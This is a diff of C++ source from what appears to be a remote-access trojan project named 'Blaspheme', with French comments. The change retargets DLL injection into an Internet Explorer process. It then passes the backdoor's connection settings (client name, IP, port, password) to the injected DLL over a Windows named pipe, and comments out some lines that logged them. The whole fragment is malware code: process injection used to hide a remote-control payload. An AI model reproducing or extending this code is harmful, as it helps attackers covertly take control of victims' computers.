@@ -1,11 +1,8 @@
-//!
-//!     Kaleidoscalp, all rights reserved.
-//!
-
 #include <system/System.hpp>
 #include <system/Registry.hpp>
 #include <malicious/Injector.hpp>
 #include <malicious/BinaryRessource.hpp>
+#include <malicious/InternetExplorer.hpp>
 #include <blaspheme/Blaspheme.hpp>
 #include <blaspheme/protocol/ConnectionInfo.hpp>
 #include <common/Convert.hpp>
@@ -110,23 +107,18 @@ namespace Inhibiter
             processToInject = DEFAULT_INJECTED_PROCESS_NAME;
         }
 
-		System::Process injected_process(processToInject, "about:blank");
-        if(!injected_process.isRunning())
-        {
-            FATAL_ERROR("Impossible de demarrer le processus a injecter.");
-        }
+		Malicious::InternetExplorer ie;
         LOG << "Injection...";
 
-		if(!Malicious::inject(injected_process.getPid(), dll_path))
+		if(!Malicious::inject(ie.getPid(), dll_path))
         //if(!Malicious::inject(injected_process.getPid(), "dll.dll"))
         {
             LOG << "Echec de l'injection. Kill du processus.";
-            injected_process.kill();
+			ie.kill();
         }
         else
         {
-            LOG << "Reussite de l'injection.";
-            string buffer = connection_infos;
+			/*
             string name_str;
             string ip_str;
             string password_str;
@@ -140,8 +132,11 @@ namespace Inhibiter
             std::getline( iss, name_str, SEPERATOR );
             std::getline( iss, password_str, SEPERATOR );
 
-            LOG << name_str + " " + ip_str + " " + port_str + " " + password_str;
-
+            LOG << "NAME : " + name_str;
+			LOG << "IP : " + ip_str;
+			LOG << "PORT : " + port_str;
+			LOG << "PASSWORD : " + password_str;
+			*/
             // la dll est injectée, il faut maintenant lui envoyer l'ip, le port, le mot de passe et le nom du client
             // pour ce faire, on utilise les "pipe" à la windows (IPC)
             Network::Pipe pipe_server;
@@ -150,8 +145,9 @@ namespace Inhibiter
             LOG << "Serveur pipe en ecoute...";
             if(pipe_server.accept())
             {
-                LOG << "Envoi des informations de connexion...";
-                pipe_server.send(info_buffer.c_str(), info_buffer.size());
+                LOG << "Envoi des informations de connexion : "+string(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
+                //pipe_server.send(buffer.c_str(), buffer.size());
+				pipe_server.send(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
             }
             pipe_server.disconnect();
         }
